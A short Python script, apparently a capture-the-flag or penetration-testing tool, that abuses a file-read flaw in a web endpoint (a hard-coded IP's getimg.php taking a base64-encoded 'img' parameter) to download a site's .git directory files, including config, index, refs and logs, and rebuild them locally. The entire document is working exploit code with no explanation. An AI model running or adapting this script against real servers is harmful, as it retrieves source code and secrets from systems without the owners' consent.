import requests
import base64
import os

tasks = [
    '.gitignore',
    '.git/COMMIT_EDITMSG',
    '.git/description',
    '.git/hooks/applypatch-msg.sample',
    '.git/hooks/applypatch-msg.sample',
    '.git/hooks/applypatch-msg.sample',
    '.git/hooks/commit-msg.sample',
    '.git/hooks/post-commit.sample',
    '.git/hooks/post-receive.sample',
    '.git/hooks/post-update.sample',
    '.git/hooks/pre-applypatch.sample',
    '.git/hooks/pre-commit.sample',
    '.git/hooks/pre-push.sample',
    '.git/hooks/pre-rebase.sample',
    '.git/hooks/pre-receive.sample',
    '.git/hooks/prepare-commit-msg.sample',
    '.git/hooks/update.sample',
    '.git/index',
    '.git/info/exclude',
    '.git/objects/info/packs',
    '.git/FETCH_HEAD',
    '.git/HEAD',
    '.git/ORIG_HEAD',
    '.git/config',
    '.git/info/refs',
    '.git/logs/HEAD',
    '.git/logs/refs/heads/master',
    '.git/logs/refs/remotes/origin/HEAD',
    '.git/logs/refs/remotes/origin/master',
    '.git/logs/refs/stash',
    '.git/packed-refs',
    '.git/refs/heads/master',
    '.git/refs/remotes/origin/HEAD',
    '.git/refs/remotes/origin/master',
    '.git/refs/stash',
    '.git/index',
    '.git/refs/remotes/origin/HEAD'
]


for i in tasks:
    folder = i.split('/')
    if len(folder) > 1:
        folder = '/'.join(folder[:-1])
        os.makedirs(folder, exist_ok=True)
        print(f'[!] folder {folder} created')
    b = base64.b64encode(i.encode('ascii'))
    r = requests.get('http://3.91.17.218/getimg.php', params={'img': b})
    if r.text.find('No such file or directory') == -1:
        print(f'[+] found {i}')
        with open(i, 'wb') as f:
            f.write(r.content)
    else:
        print(f'[X] {i} not found')

